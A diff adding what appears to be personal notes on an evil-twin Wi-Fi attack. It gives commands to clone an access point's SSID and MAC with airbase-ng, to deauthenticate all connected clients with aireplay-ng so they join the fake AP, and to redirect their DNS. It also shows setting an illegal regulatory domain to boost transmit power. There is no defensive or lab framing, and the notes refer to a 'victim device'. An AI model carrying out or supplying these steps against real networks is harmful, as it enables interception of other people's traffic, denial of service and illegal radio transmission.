@@ -1,0 +1,30 @@
+To clone an Access Point, deauthenticate all devices that were connecting to original AP, and let them connect to me.
+Also, modify DNS server record and I can control what webpage they see.
+
+Need tools:
+- airbase-ng, for cloning
+- aireplay-ng, to deauth devices
+
+1. config wlp3s0
+    ifconfig wlp3s0 down
+    iwconfig wlp3s0 mode monitor (airmon-ng start wlp3s0, to print more info)
+    airmon-ng check wlp3s0, kill the PIDs 
+2. airodump-ng wlp3s0, to scan all alive APs
+    find the target AP's MAC, and channel
+3. clone it using "airbase-ng -a [AP's MAC] --essid ["SSID Name"] -c [channel] mon0"
+    This step creates a fake AP with same SSID & MAC as the original AP.
+    mon0 is default, use airmon-ng start wlp3s0 to check mon0
+4. deauth all devices connected to original AP, so that when they try to reconnect, they will connect to me
+    aireplay-ng -0 0 -a [AP's MAC] wlp3s0
+    (to deauth a specific device, aireplay-ng -0 0 -a [AP's MAC] -c [device's MAC] wlp3s0)
+    (may need to use "iwconfig wlp3s0 channel [#]" to change channel first)
+    Note: My Fake AP's signal strength must be stronger in order for this to be successfull.
+
+To power up my Fake AP,
+    in /etc/NetworkManager/conf.d/default-wifi-powersave-on.conf, change the "wifi.powersave" value to 2
+    iw reg set BO (set reg to Bolivian..., this is usually illegal!!!)
+    iwconfig wlp3s0 txpower 27
+    iwconfig to check if the configuration worked
+
+Tried this, but for some reason, I can't make my victim device connect to my fake AP.
+And for some reason, I can't change the txpower on wlp3s0.
